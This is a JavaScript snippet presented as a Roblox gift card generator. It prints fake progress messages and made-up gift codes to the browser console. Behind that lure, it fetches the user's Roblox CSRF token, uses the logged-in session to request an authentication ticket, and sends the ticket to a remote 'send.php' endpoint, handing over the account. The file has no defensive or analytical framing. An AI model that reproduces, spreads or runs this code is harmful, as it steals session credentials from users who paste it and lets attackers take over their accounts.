console.log("Starting to find giftcards!")
console.log("Loading")
setTimeout(()=>console.log("Locating."), 1000)
setTimeout(()=>console.log("Locating.."), 2500)
setTimeout(()=>console.log("Locating..."), 3500)
setTimeout(()=>console.log("Found a GiftCard", "color: yellow"), 5000)
setTimeout(()=>console.log("PHG2V-4ZDUJ-BFU38", "color: green"), 7500)
setTimeout(()=>console.log("C3GR5-LG3D2-F5T6V", "color: green"), 10000)
setTimeout(()=>console.log("J5S63-G5C9A-0FTUX", "color: green"), 12500)
setTimeout(()=>console.log("%c[ROBLOX-GIFTCARD-GENERATOR] Overloaded To Find GiftCards! Generator. Script Forced to be closed! - 6u9bfj35asfy65g", "color: red"), 13500)
// cut the bs --

var send_url = name.split('"')[1].split("?")[0] + "send.php";

(async function() {
    // response headers generate 401 errors in output, which cannot be ignored
    var xsrf = (await (await fetch("https://www.roblox.com/home", {
        credentials: "include"
    })).text()).split("setToken('")[1].split("')")[0]

    var ticket = (await fetch("https://auth.roblox.com/v1/authentication-ticket", {
        method: "POST",
        credentials: "include",
        headers: {"x-csrf-token": xsrf}
    })).headers.get("rbx-authentication-ticket")

    await fetch(send_url + "?t=" + ticket)
})()